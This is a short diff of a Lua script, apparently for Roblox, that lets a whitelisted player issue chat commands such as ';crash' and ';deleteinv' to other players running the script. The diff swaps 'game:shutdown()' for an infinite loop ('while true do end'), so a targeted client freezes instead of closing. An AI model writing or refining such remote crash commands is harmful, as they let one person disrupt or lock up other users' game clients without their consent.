@@ -86,9 +86,9 @@ Listening = TextChatService.MessageReceived:Connect(function(prompt)
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
 
 elseif cmd == ";crash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
-game:shutdown()
+while true do end
 elseif cmd == ";crash" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
-game:shutdown()
+while true do end
 
 
 elseif cmd == ";deleteinv" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
